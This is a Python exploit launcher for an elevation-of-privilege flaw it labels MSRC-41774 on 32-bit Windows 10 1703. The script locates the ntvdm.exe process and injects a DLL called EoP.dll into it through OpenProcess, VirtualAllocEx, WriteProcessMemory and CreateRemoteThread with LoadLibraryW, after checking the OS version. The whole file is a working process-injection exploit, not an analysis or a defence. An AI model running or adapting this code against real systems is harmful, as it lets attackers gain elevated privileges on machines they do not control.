from Kernel32 import *
from os import path
from platform import release, version, architecture
from sys import argv, exit

def GetProcessId(ProcessName):
	# Get a snapshot of all running processes
	snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
	process = PROCESSENTRY32()
	process.dwSize = 36 + MAX_PATH

	# Check every process for ProcessName
	Process32First(snapshot, byref(process))
	while True:
		if process.szExeFile.decode("utf-8") == ProcessName:
			CloseHandle(snapshot)
			return process.th32ProcessID
		if not Process32Next(snapshot, byref(process)):
			CloseHandle(snapshot)
			return False

def DllInject(ProcessId):
	process = OpenProcess(PROCESS_ALL_ACCESS, False, ProcessId)

	module = GetModuleHandleW("kernel32.dll")
	LoadLibraryW = GetProcAddress(module, b"LoadLibraryW")
	CloseHandle(module)

	dll = path.dirname(path.abspath(__file__)) + "\\EoP.dll"
	address = VirtualAllocEx(process, None, len(dll), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)

	# Python3.x internally stores a unicode string, but returns the length
	# of an equivalent ascii string with len(). Hence the need for len()*2.
	WriteProcessMemory(process, address, dll, len(dll)*2, None)

	CreateRemoteThread(process, None, 0, LoadLibraryW, address, 0, None)

	CloseHandle(process)

if __name__ == "__main__":
	if release() != "10" or version() != "10.0.15063" or architecture()[0] != "32bit":
		exit("The MSRC-41774 vulnerability only exists on Windows 10 1703 x86")

	ProcessId = GetProcessId('ntvdm.exe')
	if(not ProcessId):
		exit("An MSDOS application needs to be running (ex. debug.exe)")

	DllInject(ProcessId)
